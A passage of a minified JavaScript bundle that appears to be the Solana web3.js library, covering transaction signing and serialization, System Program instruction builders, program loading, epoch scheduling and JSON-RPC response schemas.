      this.signatures[n].signature = ft.from(e);
    }
    verifySignatures(t = !0) {
      return !this._getMessageSignednessErrors(this.serializeMessage(), t);
    }
    _getMessageSignednessErrors(t, e) {
      const n = {};
      for (const { signature: r, publicKey: o } of this.signatures)
        null === r
          ? e && (n.missing || (n.missing = [])).push(o)
          : Fi(r, t, o.toBytes()) || (n.invalid || (n.invalid = [])).push(o);
      return n.invalid || n.missing ? n : void 0;
    }
    serialize(t) {
      const { requireAllSignatures: e, verifySignatures: n } = Object.assign(
          { requireAllSignatures: !0, verifySignatures: !0 },
          t
        ),
        r = this.serializeMessage();
      if (n) {
        const t = this._getMessageSignednessErrors(r, e);
        if (t) {
          let e = "Signature verification failed.";
          throw (
            (t.invalid &&
              (e += `\nInvalid signature for public key${
                1 === t.invalid.length ? "" : "(s)"
              } [\`${t.invalid.map((t) => t.toBase58()).join("`, `")}\`].`),
            t.missing &&
              (e += `\nMissing signature for public key${
                1 === t.missing.length ? "" : "(s)"
              } [\`${t.missing.map((t) => t.toBase58()).join("`, `")}\`].`),
            new Error(e))
          );
        }
      }
      return this._serialize(r);
    }
    _serialize(t) {
      const { signatures: e } = this,
        n = [];
      cs(n, e.length);
      const r = n.length + 64 * e.length + t.length,
        o = ft.alloc(r);
      return (
        ls(e.length < 256),
        ft.from(n).copy(o, 0),
        e.forEach(({ signature: t }, e) => {
          null !== t &&
            (ls(64 === t.length, "signature has invalid length"),
            ft.from(t).copy(o, n.length + 64 * e));
        }),
        t.copy(o, n.length + 64 * e.length),
        ls(o.length <= Qi, `Transaction too large: ${o.length} > 1232`),
        o
      );
    }
    get keys() {
      return (
        ls(1 === this.instructions.length),
        this.instructions[0].keys.map((t) => t.pubkey)
      );
    }
    get programId() {
      return ls(1 === this.instructions.length), this.instructions[0].programId;
    }
    get data() {
      return ls(1 === this.instructions.length), this.instructions[0].data;
    }
    static from(t) {
      let e = [...t];
      const n = us(e);
      let r = [];
      for (let o = 0; o < n; o++) {
        const t = ps(e, 0, 64);
        r.push(sr.encode(ft.from(t)));
      }
      return As.populate(ms.from(e), r);
    }
    static populate(t, e = []) {
      const n = new As();
      return (
        (n.recentBlockhash = t.recentBlockhash),
        t.header.numRequiredSignatures > 0 && (n.feePayer = t.accountKeys[0]),
        e.forEach((e, r) => {
          const o = {
            signature: e == sr.encode(bs) ? null : sr.decode(e),
            publicKey: t.accountKeys[r],
          };
          n.signatures.push(o);
        }),
        t.instructions.forEach((e) => {
          const r = e.accounts.map((e) => {
            const r = t.accountKeys[e];
            return {
              pubkey: r,
              isSigner:
                n.signatures.some(
                  (t) => t.publicKey.toString() === r.toString()
                ) || t.isAccountSigner(e),
              isWritable: t.isAccountWritable(e),
            };
          });
          n.instructions.push(
            new vs({
              keys: r,
              programId: t.accountKeys[e.programIdIndex],
              data: sr.decode(e.data),
            })
          );
        }),
        (n._message = t),
        (n._json = n.toJSON()),
        n
      );
    }
  }
  class ks {
    constructor(t) {
      (this.payerKey = void 0),
        (this.instructions = void 0),
        (this.recentBlockhash = void 0),
        (this.payerKey = t.payerKey),
        (this.instructions = t.instructions),
        (this.recentBlockhash = t.recentBlockhash);
    }
    static decompile(t, e) {
      const { header: n, compiledInstructions: r, recentBlockhash: o } = t,
        {
          numRequiredSignatures: i,
          numReadonlySignedAccounts: s,
          numReadonlyUnsignedAccounts: a,
        } = n,
        u = i - s;
      ls(u > 0, "Message header is invalid");
      const c = t.staticAccountKeys.length - i - a;
      ls(c >= 0, "Message header is invalid");
      const l = t.getAccountKeys(e),
        d = l.get(0);
      if (void 0 === d)
        throw new Error(
          "Failed to decompile message because no account keys were found"
        );
      const f = [];
      for (const h of r) {
        const t = [];
        for (const r of h.accountKeyIndexes) {
          const e = l.get(r);
          if (void 0 === e)
            throw new Error(`Failed to find key for account key index ${r}`);
          let o;
          (o =
            r < i
              ? r < u
              : r < l.staticAccountKeys.length
              ? r - i < c
              : r - l.staticAccountKeys.length <
                l.accountKeysFromLookups.writable.length),
            t.push({
              pubkey: e,
              isSigner: r < n.numRequiredSignatures,
              isWritable: o,
            });
        }
        const e = l.get(h.programIdIndex);
        if (void 0 === e)
          throw new Error(
            `Failed to find program id for program id index ${h.programIdIndex}`
          );
        f.push(new vs({ programId: e, data: ji(h.data), keys: t }));
      }
      return new ks({ payerKey: d, instructions: f, recentBlockhash: o });
    }
    compileToLegacyMessage() {
      return ms.compile({
        payerKey: this.payerKey,
        recentBlockhash: this.recentBlockhash,
        instructions: this.instructions,
      });
    }
    compileToV0Message(t) {
      return gs.compile({
        payerKey: this.payerKey,
        recentBlockhash: this.recentBlockhash,
        instructions: this.instructions,
        addressLookupTableAccounts: t,
      });
    }
  }
  class Is {
    get version() {
      return this.message.version;
    }
    constructor(t, e) {
      if (((this.signatures = void 0), (this.message = void 0), void 0 !== e))
        ls(
          e.length === t.header.numRequiredSignatures,
          "Expected signatures length to be equal to the number of required signatures"
        ),
          (this.signatures = e);
      else {
        const e = [];
        for (let n = 0; n < t.header.numRequiredSignatures; n++)
          e.push(new Uint8Array(64));
        this.signatures = e;
      }
      this.message = t;
    }
    serialize() {
      const t = this.message.serialize(),
        e = Array();
      cs(e, this.signatures.length);
      const n = Er.struct([
          Er.blob(e.length, "encodedSignaturesLength"),
          Er.seq(is(), this.signatures.length, "signatures"),
          Er.blob(t.length, "serializedMessage"),
        ]),
        r = new Uint8Array(2048),
        o = n.encode(
          {
            encodedSignaturesLength: new Uint8Array(e),
            signatures: this.signatures,
            serializedMessage: t,
          },
          r
        );
      return r.slice(0, o);
    }
    static deserialize(t) {
      let e = [...t];
      const n = [],
        r = us(e);
      for (let i = 0; i < r; i++) n.push(new Uint8Array(ps(e, 0, 64)));
      const o = ys.deserialize(new Uint8Array(e));
      return new Is(o, n);
    }
    sign(t) {
      const e = this.message.serialize(),
        n = this.message.staticAccountKeys.slice(
          0,
          this.message.header.numRequiredSignatures
        );
      for (const r of t) {
        const t = n.findIndex((t) => t.equals(r.publicKey));
        ls(t >= 0, `Cannot sign with non signer key ${r.publicKey.toBase58()}`),
          (this.signatures[t] = Wi(e, r.secretKey));
      }
    }
    addSignature(t, e) {
      ls(64 === e.byteLength, "Signature must be 64 bytes long");
      const n = this.message.staticAccountKeys
        .slice(0, this.message.header.numRequiredSignatures)
        .findIndex((e) => e.equals(t));
      ls(
        n >= 0,
        `Can not add signature; \`${t.toBase58()}\` is not required to sign this transaction`
      ),
        (this.signatures[n] = e);
    }
  }
  const Ss = new Ji("SysvarC1ock11111111111111111111111111111111"),
    _s = new Ji("SysvarEpochSchedu1e111111111111111111111111"),
    Ts = new Ji("Sysvar1nstructions1111111111111111111111111"),
    Bs = new Ji("SysvarRecentB1ockHashes11111111111111111111"),
    Cs = new Ji("SysvarRent111111111111111111111111111111111"),
    Es = new Ji("SysvarRewards111111111111111111111111111111"),
    xs = new Ji("SysvarS1otHashes111111111111111111111111111"),
    Ps = new Ji("SysvarS1otHistory11111111111111111111111111"),
    Os = new Ji("SysvarStakeHistory1111111111111111111111111");
  class Rs extends Error {
    constructor({ action: t, signature: e, transactionMessage: n, logs: r }) {
      const o = r ? `Logs: \n${JSON.stringify(r.slice(-10), null, 2)}. ` : "",
        i =
          "\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";
      let s;
      switch (t) {
        case "send":
          s = `Transaction ${e} resulted in an error. \n${n}. ` + o + i;
          break;
        case "simulate":
          s = `Simulation failed. \nMessage: ${n}. \n` + o + i;
          break;
        default:
          s = `Unknown action '${t}'`;
      }
      super(s),
        (this.signature = void 0),
        (this.transactionMessage = void 0),
        (this.transactionLogs = void 0),
        (this.signature = e),
        (this.transactionMessage = n),
        (this.transactionLogs = r || void 0);
    }
    get transactionError() {
      return {
        message: this.transactionMessage,
        logs: Array.isArray(this.transactionLogs)
          ? this.transactionLogs
          : void 0,
      };
    }
    get logs() {
      const t = this.transactionLogs;
      if (null == t || "object" != typeof t || !("then" in t)) return t;
    }
    async getLogs(t) {
      return (
        Array.isArray(this.transactionLogs) ||
          (this.transactionLogs = new Promise((e, n) => {
            t.getTransaction(this.signature)
              .then((t) => {
                if (t && t.meta && t.meta.logMessages) {
                  const n = t.meta.logMessages;
                  (this.transactionLogs = n), e(n);
                } else n(new Error("Log messages not found"));
              })
              .catch(n);
          })),
        await this.transactionLogs
      );
    }
  }
  class Ms extends Error {
    constructor({ code: t, message: e, data: n }, r) {
      super(null != r ? `${r}: ${e}` : e),
        (this.code = void 0),
        (this.data = void 0),
        (this.code = t),
        (this.data = n),
        (this.name = "SolanaJSONRPCError");
    }
  }
  async function Ls(t, e, n, r) {
    const o = r && {
        skipPreflight: r.skipPreflight,
        preflightCommitment: r.preflightCommitment || r.commitment,
        maxRetries: r.maxRetries,
        minContextSlot: r.minContextSlot,
      },
      i = await t.sendTransaction(e, n, o);
    let s;
    if (null != e.recentBlockhash && null != e.lastValidBlockHeight)
      s = (
        await t.confirmTransaction(
          {
            abortSignal: null == r ? void 0 : r.abortSignal,
            signature: i,
            blockhash: e.recentBlockhash,
            lastValidBlockHeight: e.lastValidBlockHeight,
          },
          r && r.commitment
        )
      ).value;
    else if (null != e.minNonceContextSlot && null != e.nonceInfo) {
      const { nonceInstruction: n } = e.nonceInfo,
        o = n.keys[0].pubkey;
      s = (
        await t.confirmTransaction(
          {
            abortSignal: null == r ? void 0 : r.abortSignal,
            minContextSlot: e.minNonceContextSlot,
            nonceAccountPubkey: o,
            nonceValue: e.nonceInfo.nonce,
            signature: i,
          },
          r && r.commitment
        )
      ).value;
    } else
      null != (null == r ? void 0 : r.abortSignal),
        0,
        (s = (await t.confirmTransaction(i, r && r.commitment)).value);
    if (s.err) {
      if (null != i)
        throw new Rs({
          action: "send",
          signature: i,
          transactionMessage: `Status: (${JSON.stringify(s)})`,
        });
      throw new Error(`Transaction ${i} failed (${JSON.stringify(s)})`);
    }
    return i;
  }
  function Ns(t) {
    return new Promise((e) => setTimeout(e, t));
  }
  function Ds(t, e) {
    const n = t.layout.span >= 0 ? t.layout.span : as(t, e),
      r = ft.alloc(n),
      o = Object.assign({ instruction: t.index }, e);
    return t.layout.encode(o, r), r;
  }
  function Us(t, e) {
    let n;
    try {
      n = t.layout.decode(e);
    } catch (r) {
      throw new Error("invalid instruction; " + r);
    }
    if (n.instruction !== t.index)
      throw new Error(
        `invalid instruction; instruction index mismatch ${n.instruction} != ${t.index}`
      );
    return n;
  }
  const qs = Er.nu64("lamportsPerSignature"),
    zs = Er.struct([
      Er.u32("version"),
      Er.u32("state"),
      os("authorizedPubkey"),
      os("nonce"),
      Er.struct([qs], "feeCalculator"),
    ]),
    Ks = zs.span;
  class Ws {
    constructor(t) {
      (this.authorizedPubkey = void 0),
        (this.nonce = void 0),
        (this.feeCalculator = void 0),
        (this.authorizedPubkey = t.authorizedPubkey),
        (this.nonce = t.nonce),
        (this.feeCalculator = t.feeCalculator);
    }
    static fromAccountData(t) {
      const e = zs.decode(ji(t), 0);
      return new Ws({
        authorizedPubkey: new Ji(e.authorizedPubkey),
        nonce: new Ji(e.nonce).toString(),
        feeCalculator: e.feeCalculator,
      });
    }
  }
  function Fs(t) {
    const e = Er.blob(8, t),
      n = e.decode.bind(e),
      r = e.encode.bind(e),
      o = e,
      i = qr();
    return (
      (o.decode = (t, e) => {
        const r = n(t, e);
        return i.decode(r);
      }),
      (o.encode = (t, e, n) => {
        const o = i.encode(t);
        return r(o, e, n);
      }),
      o
    );
  }
  const js = Object.freeze({
    Create: {
      index: 0,
      layout: Er.struct([
        Er.u32("instruction"),
        Er.ns64("lamports"),
        Er.ns64("space"),
        os("programId"),
      ]),
    },
    Assign: {
      index: 1,
      layout: Er.struct([Er.u32("instruction"), os("programId")]),
    },
    Transfer: {
      index: 2,
      layout: Er.struct([Er.u32("instruction"), Fs("lamports")]),
    },
    CreateWithSeed: {
      index: 3,
      layout: Er.struct([
        Er.u32("instruction"),
        os("base"),
        ss("seed"),
        Er.ns64("lamports"),
        Er.ns64("space"),
        os("programId"),
      ]),
    },
    AdvanceNonceAccount: {
      index: 4,
      layout: Er.struct([Er.u32("instruction")]),
    },
    WithdrawNonceAccount: {
      index: 5,
      layout: Er.struct([Er.u32("instruction"), Er.ns64("lamports")]),
    },
    InitializeNonceAccount: {
      index: 6,
      layout: Er.struct([Er.u32("instruction"), os("authorized")]),
    },
    AuthorizeNonceAccount: {
      index: 7,
      layout: Er.struct([Er.u32("instruction"), os("authorized")]),
    },
    Allocate: {
      index: 8,
      layout: Er.struct([Er.u32("instruction"), Er.ns64("space")]),
    },
    AllocateWithSeed: {
      index: 9,
      layout: Er.struct([
        Er.u32("instruction"),
        os("base"),
        ss("seed"),
        Er.ns64("space"),
        os("programId"),
      ]),
    },
    AssignWithSeed: {
      index: 10,
      layout: Er.struct([
        Er.u32("instruction"),
        os("base"),
        ss("seed"),
        os("programId"),
      ]),
    },
    TransferWithSeed: {
      index: 11,
      layout: Er.struct([
        Er.u32("instruction"),
        Fs("lamports"),
        ss("seed"),
        os("programId"),
      ]),
    },
    UpgradeNonceAccount: {
      index: 12,
      layout: Er.struct([Er.u32("instruction")]),
    },
  });
  class Gs {
    constructor() {}
    static createAccount(t) {
      const e = Ds(js.Create, {
        lamports: t.lamports,
        space: t.space,
        programId: ji(t.programId.toBuffer()),
      });
      return new vs({
        keys: [
          { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
          { pubkey: t.newAccountPubkey, isSigner: !0, isWritable: !0 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static transfer(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ds(js.TransferWithSeed, {
          lamports: BigInt(t.lamports),
          seed: t.seed,
          programId: ji(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.fromPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
            { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          ]);
      } else {
        (e = Ds(js.Transfer, { lamports: BigInt(t.lamports) })),
          (n = [
            { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
            { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          ]);
      }
      return new vs({ keys: n, programId: this.programId, data: e });
    }
    static assign(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ds(js.AssignWithSeed, {
          base: ji(t.basePubkey.toBuffer()),
          seed: t.seed,
          programId: ji(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.accountPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
          ]);
      } else {
        (e = Ds(js.Assign, { programId: ji(t.programId.toBuffer()) })),
          (n = [{ pubkey: t.accountPubkey, isSigner: !0, isWritable: !0 }]);
      }
      return new vs({ keys: n, programId: this.programId, data: e });
    }
    static createAccountWithSeed(t) {
      const e = Ds(js.CreateWithSeed, {
        base: ji(t.basePubkey.toBuffer()),
        seed: t.seed,
        lamports: t.lamports,
        space: t.space,
        programId: ji(t.programId.toBuffer()),
      });
      let n = [
        { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
        { pubkey: t.newAccountPubkey, isSigner: !1, isWritable: !0 },
      ];
      return (
        t.basePubkey.equals(t.fromPubkey) ||
          n.push({ pubkey: t.basePubkey, isSigner: !0, isWritable: !1 }),
        new vs({ keys: n, programId: this.programId, data: e })
      );
    }
    static createNonceAccount(t) {
      const e = new As();
      "basePubkey" in t && "seed" in t
        ? e.add(
            Gs.createAccountWithSeed({
              fromPubkey: t.fromPubkey,
              newAccountPubkey: t.noncePubkey,
              basePubkey: t.basePubkey,
              seed: t.seed,
              lamports: t.lamports,
              space: Ks,
              programId: this.programId,
            })
          )
        : e.add(
            Gs.createAccount({
              fromPubkey: t.fromPubkey,
              newAccountPubkey: t.noncePubkey,
              lamports: t.lamports,
              space: Ks,
              programId: this.programId,
            })
          );
      const n = {
        noncePubkey: t.noncePubkey,
        authorizedPubkey: t.authorizedPubkey,
      };
      return e.add(this.nonceInitialize(n)), e;
    }
    static nonceInitialize(t) {
      const e = Ds(js.InitializeNonceAccount, {
          authorized: ji(t.authorizedPubkey.toBuffer()),
        }),
        n = {
          keys: [
            { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
            { pubkey: Bs, isSigner: !1, isWritable: !1 },
            { pubkey: Cs, isSigner: !1, isWritable: !1 },
          ],
          programId: this.programId,
          data: e,
        };
      return new vs(n);
    }
    static nonceAdvance(t) {
      const e = Ds(js.AdvanceNonceAccount),
        n = {
          keys: [
            { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
            { pubkey: Bs, isSigner: !1, isWritable: !1 },
            { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
          ],
          programId: this.programId,
          data: e,
        };
      return new vs(n);
    }
    static nonceWithdraw(t) {
      const e = Ds(js.WithdrawNonceAccount, { lamports: t.lamports });
      return new vs({
        keys: [
          { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
          { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          { pubkey: Bs, isSigner: !1, isWritable: !1 },
          { pubkey: Cs, isSigner: !1, isWritable: !1 },
          { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static nonceAuthorize(t) {
      const e = Ds(js.AuthorizeNonceAccount, {
        authorized: ji(t.newAuthorizedPubkey.toBuffer()),
      });
      return new vs({
        keys: [
          { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
          { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static allocate(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ds(js.AllocateWithSeed, {
          base: ji(t.basePubkey.toBuffer()),
          seed: t.seed,
          space: t.space,
          programId: ji(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.accountPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
          ]);
      } else {
        (e = Ds(js.Allocate, { space: t.space })),
          (n = [{ pubkey: t.accountPubkey, isSigner: !0, isWritable: !0 }]);
      }
      return new vs({ keys: n, programId: this.programId, data: e });
    }
  }
  Gs.programId = new Ji("11111111111111111111111111111111");
  class Vs {
    constructor() {}
    static getMinNumSignatures(t) {
      return 2 * (Math.ceil(t / Vs.chunkSize) + 1 + 1);
    }
    static async load(t, e, n, r, o) {
      {
        const i = await t.getMinimumBalanceForRentExemption(o.length),
          s = await t.getAccountInfo(n.publicKey, "confirmed");
        let a = null;
        if (null !== s) {
          if (s.executable) return void 0, !1;
          s.data.length !== o.length &&
            ((a = a || new As()),
            a.add(
              Gs.allocate({ accountPubkey: n.publicKey, space: o.length })
            )),
            s.owner.equals(r) ||
              ((a = a || new As()),
              a.add(Gs.assign({ accountPubkey: n.publicKey, programId: r }))),
            s.lamports < i &&
              ((a = a || new As()),
              a.add(
                Gs.transfer({
                  fromPubkey: e.publicKey,
                  toPubkey: n.publicKey,
                  lamports: i - s.lamports,
                })
              ));
        } else
          a = new As().add(
            Gs.createAccount({
              fromPubkey: e.publicKey,
              newAccountPubkey: n.publicKey,
              lamports: i > 0 ? i : 1,
              space: o.length,
              programId: r,
            })
          );
        null !== a && (await Ls(t, a, [e, n], { commitment: "confirmed" }));
      }
      const i = Er.struct([
          Er.u32("instruction"),
          Er.u32("offset"),
          Er.u32("bytesLength"),
          Er.u32("bytesLengthPadding"),
          Er.seq(Er.u8("byte"), Er.offset(Er.u32(), -8), "bytes"),
        ]),
        s = Vs.chunkSize;
      let a = 0,
        u = o,
        c = [];
      for (; u.length > 0; ) {
        const o = u.slice(0, s),
          l = ft.alloc(s + 16);
        i.encode(
          {
            instruction: 0,
            offset: a,
            bytes: o,
            bytesLength: 0,
            bytesLengthPadding: 0,
          },
          l
        );
        const d = new As().add({
          keys: [{ pubkey: n.publicKey, isSigner: !0, isWritable: !0 }],
          programId: r,
          data: l,
        });
        if (
          (c.push(Ls(t, d, [e, n], { commitment: "confirmed" })),
          t._rpcEndpoint.includes("solana.com"))
        ) {
          const t = 4;
          await Ns(1e3 / t);
        }
        (a += s), (u = u.slice(s));
      }
      await Promise.all(c);
      {
        const o = Er.struct([Er.u32("instruction")]),
          i = ft.alloc(o.span);
        o.encode({ instruction: 1 }, i);
        const s = new As().add({
            keys: [
              { pubkey: n.publicKey, isSigner: !0, isWritable: !0 },
              { pubkey: Cs, isSigner: !1, isWritable: !1 },
            ],
            programId: r,
            data: i,
          }),
          a = "processed",
          u = await t.sendTransaction(s, [e, n], { preflightCommitment: a }),
          { context: c, value: l } = await t.confirmTransaction(
            {
              signature: u,
              lastValidBlockHeight: s.lastValidBlockHeight,
              blockhash: s.recentBlockhash,
            },
            a
          );
        if (l.err)
          throw new Error(`Transaction ${u} failed (${JSON.stringify(l)})`);
        for (;;) {
          try {
            if ((await t.getSlot({ commitment: a })) > c.slot) break;
          } catch {}
          await new Promise((t) => setTimeout(t, Math.round(200)));
        }
      }
      return !0;
    }
  }
  Vs.chunkSize = 932;
  const Hs = new Ji("BPFLoader2111111111111111111111111111111111");
  var Zs, Xs;
  var Js = (function () {
      if (Xs) return Zs;
      Xs = 1;
      var t = Object.prototype.toString,
        e =
          Object.keys ||
          function (t) {
            var e = [];
            for (var n in t) e.push(n);
            return e;
          };
      function n(r, o) {
        var i, s, a, u, c, l, d;
        if (!0 === r) return "true";
        if (!1 === r) return "false";
        switch (typeof r) {
          case "object":
            if (null === r) return null;
            if (r.toJSON && "function" == typeof r.toJSON)
              return n(r.toJSON(), o);
            if ("[object Array]" === (d = t.call(r))) {
              for (a = "[", s = r.length - 1, i = 0; i < s; i++)
                a += n(r[i], !0) + ",";
              return s > -1 && (a += n(r[i], !0)), a + "]";
            }
            if ("[object Object]" === d) {
              for (s = (u = e(r).sort()).length, a = "", i = 0; i < s; )
                void 0 !== (l = n(r[(c = u[i])], !1)) &&
                  (a && (a += ","), (a += JSON.stringify(c) + ":" + l)),
                  i++;
              return "{" + a + "}";
            }
            return JSON.stringify(r);
          case "function":
          case "undefined":
            return o ? null : void 0;
          case "string":
            return JSON.stringify(r);
          default:
            return isFinite(r) ? r : null;
        }
      }
      return (Zs = function (t) {
        var e = n(t, !1);
        if (void 0 !== e) return "" + e;
      });
    })(),
    Ys = (function (t) {
      return t &&
        t.__esModule &&
        Object.prototype.hasOwnProperty.call(t, "default")
        ? t.default
        : t;
    })(Js);
  function Qs(t) {
    let e = 0;
    for (; t > 1; ) (t /= 2), e++;
    return e;
  }
  class $s {
    constructor(t, e, n, r, o) {
      (this.slotsPerEpoch = void 0),
        (this.leaderScheduleSlotOffset = void 0),
        (this.warmup = void 0),
        (this.firstNormalEpoch = void 0),
        (this.firstNormalSlot = void 0),
        (this.slotsPerEpoch = t),
        (this.leaderScheduleSlotOffset = e),
        (this.warmup = n),
        (this.firstNormalEpoch = r),
        (this.firstNormalSlot = o);
    }
    getEpoch(t) {
      return this.getEpochAndSlotIndex(t)[0];
    }
    getEpochAndSlotIndex(t) {
      if (t < this.firstNormalSlot) {
        const n =
          Qs(
            0 === (e = t + 32 + 1)
              ? 1
              : (e--,
                (e |= e >> 1),
                (e |= e >> 2),
                (e |= e >> 4),
                (e |= e >> 8),
                (e |= e >> 16),
                1 + (e |= e >> 32))
          ) -
          Qs(32) -
          1;
        return [n, t - (this.getSlotsInEpoch(n) - 32)];
      }
      {
        const e = t - this.firstNormalSlot,
          n = Math.floor(e / this.slotsPerEpoch);
        return [this.firstNormalEpoch + n, e % this.slotsPerEpoch];
      }
      var e;
    }
    getFirstSlotInEpoch(t) {
      return t <= this.firstNormalEpoch
        ? 32 * (Math.pow(2, t) - 1)
        : (t - this.firstNormalEpoch) * this.slotsPerEpoch +
            this.firstNormalSlot;
    }
    getLastSlotInEpoch(t) {
      return this.getFirstSlotInEpoch(t) + this.getSlotsInEpoch(t) - 1;
    }
    getSlotsInEpoch(t) {
      return t < this.firstNormalEpoch
        ? Math.pow(2, t + Qs(32))
        : this.slotsPerEpoch;
    }
  }
  var ta = globalThis.fetch;
  class ea extends $o {
    constructor(t, e, n) {
      super(
        (t) => {
          const n = (function (t, e) {
            return new Yo(t, e);
          })(t, {
            autoconnect: !0,
            max_reconnects: 5,
            reconnect: !0,
            reconnect_interval: 1e3,
            ...e,
          });
          return (this.underlyingSocket = "socket" in n ? n.socket : n), n;
        },
        t,
        e,
        n
      ),
        (this.underlyingSocket = void 0);
    }
    call(...t) {
      var e;
      const n = null == (e = this.underlyingSocket) ? void 0 : e.readyState;
      return 1 === n
        ? super.call(...t)
        : Promise.reject(
            new Error(
              "Tried to call a JSON-RPC method `" +
                t[0] +
                "` but the socket was not `CONNECTING` or `OPEN` (`readyState` was " +
                n +
                ")"
            )
          );
    }
    notify(...t) {
      var e;
      const n = null == (e = this.underlyingSocket) ? void 0 : e.readyState;
      return 1 === n
        ? super.notify(...t)
        : Promise.reject(
            new Error(
              "Tried to send a JSON-RPC notification `" +
                t[0] +
                "` but the socket was not `CONNECTING` or `OPEN` (`readyState` was " +
                n +
                ")"
            )
          );
    }
  }
  class na {
    constructor(t) {
      (this.key = void 0),
        (this.state = void 0),
        (this.key = t.key),
        (this.state = t.state);
    }
    isActive() {
      const t = BigInt("0xffffffffffffffff");
      return this.state.deactivationSlot === t;
    }
    static deserialize(t) {
      const e = (function (t, e) {
          let n;
          try {
            n = t.layout.decode(e);
          } catch (r) {
            throw new Error("invalid instruction; " + r);
          }
          if (n.typeIndex !== t.index)
            throw new Error(
              `invalid account data; account type mismatch ${n.typeIndex} != ${t.index}`
            );
          return n;
        })(ra, t),
        n = t.length - 56;
      ls(n >= 0, "lookup table is invalid"),
        ls(n % 32 == 0, "lookup table is invalid");
      const r = n / 32,
        { addresses: o } = Er.struct([Er.seq(os(), r, "addresses")]).decode(
          t.slice(56)
        );
      return {
        deactivationSlot: e.deactivationSlot,
        lastExtendedSlot: e.lastExtendedSlot,
        lastExtendedSlotStartIndex: e.lastExtendedStartIndex,
        authority: 0 !== e.authority.length ? new Ji(e.authority[0]) : void 0,
        addresses: o.map((t) => new Ji(t)),
      };
    }
  }
  const ra = {
      index: 1,
      layout: Er.struct([
        Er.u32("typeIndex"),
        Fs("deactivationSlot"),
        Er.nu64("lastExtendedSlot"),
        Er.u8("lastExtendedStartIndex"),
        Er.u8(),
        Er.seq(os(), Er.offset(Er.u8(), -1), "authority"),
      ]),
    },
    oa = /^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;
  const ia = ho(eo(Ji), ao(), (t) => new Ji(t)),
    sa = uo([ao(), no("base64")]),
    aa = ho(eo(ft), sa, (t) => ft.from(t[0], "base64"));
  function ua(t) {
    let e, n;
    if ("string" == typeof t) e = t;
    else if (t) {
      const { commitment: r, ...o } = t;
      (e = r), (n = o);
    }
    return { commitment: e, config: n };
  }
  function ca(t) {
    return t.map((t) =>
      "memcmp" in t
        ? {
            ...t,
            memcmp: { ...t.memcmp, encoding: t.memcmp.encoding ?? "base58" },
          }
        : t
    );
  }
  function la(t) {
    return lo([
      co({ jsonrpc: no("2.0"), id: ao(), result: t }),
      co({
        jsonrpc: no("2.0"),
        id: ao(),
        error: co({ code: fo(), message: ao(), data: io(Qr("any", () => !0)) }),
      }),
    ]);
  }
  const da = la(fo());
  function fa(t) {
    return ho(la(t), da, (e) =>
      "error" in e ? e : { ...e, result: Xr(e.result, t) }
    );
  }
  function ha(t) {
    return fa(co({ context: co({ slot: oo() }), value: t }));
  }
  function pa(t) {
    return co({ context: co({ slot: oo() }), value: t });
  }
  function ma(t, e) {
    return 0 === t
      ? new gs({
          header: e.header,
          staticAccountKeys: e.accountKeys.map((t) => new Ji(t)),
          recentBlockhash: e.recentBlockhash,
          compiledInstructions: e.instructions.map((t) => ({
            programIdIndex: t.programIdIndex,
            accountKeyIndexes: t.accounts,
            data: sr.decode(t.data),
          })),
          addressTableLookups: e.addressTableLookups,
        })
      : new ms(e);
  }
  const ga = co({
      foundation: oo(),
      foundationTerm: oo(),
      initial: oo(),
      taper: oo(),
      terminal: oo(),
    }),
    ya = fa(
      $r(
        ro(
          co({
            epoch: oo(),
            effectiveSlot: oo(),
            amount: oo(),
            postBalance: oo(),
            commission: io(ro(oo())),
          })
        )
      )
    ),
    wa = $r(co({ slot: oo(), prioritizationFee: oo() })),
    ba = co({ total: oo(), validator: oo(), foundation: oo(), epoch: oo() }),
    va = co({
      epoch: oo(),
      slotIndex: oo(),
      slotsInEpoch: oo(),
      absoluteSlot: oo(),
      blockHeight: io(oo()),
      transactionCount: io(oo()),
    }),
    Aa = co({
      slotsPerEpoch: oo(),
      leaderScheduleSlotOffset: oo(),
      warmup: to(),
      firstNormalEpoch: oo(),
      firstNormalSlot: oo(),
    }),
    ka = so(ao(), $r(oo())),
    Ia = ro(lo([co({}), ao()])),
    Sa = co({ err: Ia }),
    _a = no("receivedSignature"),
    Ta = co({ "solana-core": ao(), "feature-set": io(oo()) }),
    Ba = co({ program: ao(), programId: ia, parsed: fo() }),
    Ca = co({ programId: ia, accounts: $r(ia), data: ao() }),
    Ea = ha(
      co({
        err: ro(lo([co({}), ao()])),
        logs: ro($r(ao())),
        accounts: io(
          ro(
            $r(
              ro(
                co({
                  executable: to(),
                  owner: ao(),
                  lamports: oo(),
                  data: $r(ao()),
                  rentEpoch: io(oo()),
                })
              )
            )
          )
        ),
        unitsConsumed: io(oo()),
        returnData: io(
          ro(co({ programId: ao(), data: uo([ao(), no("base64")]) }))
        ),
        innerInstructions: io(
          ro($r(co({ index: oo(), instructions: $r(lo([Ba, Ca])) })))
        ),
      })
    ),
    xa = ha(
      co({
